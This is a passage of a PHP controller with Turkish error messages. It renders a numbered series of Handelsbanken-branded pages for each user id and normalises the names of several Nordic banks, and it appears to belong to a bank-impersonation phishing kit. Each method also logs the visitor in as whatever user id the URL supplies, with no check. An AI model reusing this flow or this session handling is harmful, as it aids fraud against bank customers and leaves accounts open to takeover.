            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/handelsbanken2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function handelsbanken3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/handelsbanken3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function handelsbanken4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/handelsbanken4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function handelsbanken5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/handelsbanken5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    private function slugify(string $text): string
    {
        $text = mb_strtolower(trim($text), 'UTF-8');
        
        $replacements = [
            'å' => 'a',
            'ä' => 'a',
            'ö' => 'o',
            'Å' => 'a',
            'Ä' => 'a',
            'Ö' => 'o',
            'ålandsbanken' => 'alandsbanken',
            'Ålandsbanken' => 'alandsbanken',
            'ÅLANDSBANKEN' => 'alandsbanken',
            'danske bank' => 'danske',
            's-pankki' => 's-pankkibank',
            'op' => 'opbank',
            'op pohjola' => 'opbank',
            'S-Pankki' => 's-pankkibank',
            'S-PANKKI' => 's-pankkibank',
            'pop pankki' => 'poppankki',
            'POP Pankki' => 'poppankki',
            'POP PANKKI' => 'poppankki'
        ];
        
        foreach ($replacements as $search => $replace) {
            $text = str_ireplace($search, $replace, $text);
        }
        
        $text = preg_replace('/[^a-z0-9-]/', '-', $text);
        $text = preg_replace('/-+/', '-', $text);
        $text = trim($text, '-');
        
        return $text;
    }
}

